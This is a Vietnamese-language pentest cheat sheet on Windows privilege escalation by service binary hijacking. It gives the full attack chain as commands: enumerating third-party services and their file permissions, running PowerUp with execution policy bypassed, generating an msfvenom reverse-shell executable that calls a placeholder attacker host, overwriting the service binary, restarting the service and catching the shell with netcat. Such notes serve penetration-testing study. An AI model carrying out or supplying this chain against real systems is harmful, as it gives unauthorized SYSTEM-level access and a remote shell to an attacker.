# Service Binary Hijacking

## Điểm chính khai thác

* Khai thác các dịch vụ Windows không phải hệ thống (binaries không nằm trong C:\Windows) để nâng quyền, tận dụng cấu hình sai hoặc tệp nhị phân có thể ghi.
* Dịch vụ chạy với quyền LocalSystem cung cấp đặc quyền SYSTEM nếu binary bị thay thế bằng mã độc.
* Quyền Modify (M) hoặc Full (F) trên tệp nhị phân dịch vụ cho phép ghi đè, thường thấy ở phần mềm bên thứ ba.
* Khả năng khởi động lại dịch vụ (CanRestart) hoặc kích hoạt khác (như reboot) cần thiết để chạy payload.

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Tìm các dịch vụ với binaries không nằm trong C:\Windows để xác định dịch vụ bên thứ ba dễ khai thác:

{% code overflow="wrap" %}

```
Get-WmiObject Win32_Service | Where-Object { -not ($_.PathName -like "C:\Windows*") } | Select-Object Name, DisplayName, PathName
```

{% endcode %}

Liệt kê chi tiết cấu hình dịch vụ để xác định đường dẫn nhị phân và quyền thực thi:

```
cmd /c "sc qc <service>"
```

#### Kiểm tra quyền truy cập hoặc cấu hình

Kiểm tra quyền trên tệp nhị phân dịch vụ để xác định khả năng ghi đè:

```
icacls <file>.exe
```

Tự động tìm dịch vụ có tệp nhị phân dễ sửa đổi bằng PowerUp:

```
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

#### Phân tích ngữ cảnh thực thi

Phát hiện tiến trình dịch vụ để xác định hành vi thực thi và quyền:

```
pspy
```

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Tạo reverse shell để thay thế tệp nhị phân dịch vụ:

{% code overflow="wrap" %}

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe -o shell.exe
```

{% endcode %}

Thay thế tệp nhị phân dịch vụ bằng reverse shell:

```
copy shell.exe <file>.exe
```

#### Áp dụng khai thác

Khởi động lại dịch vụ để chạy reverse shell:

```
sc stop <service_name>
sc start <service_name>
```

#### Kích hoạt khai thác

Chờ kết nối reverse shell sau khi dịch vụ khởi động:

```
nc -lvnp 443
```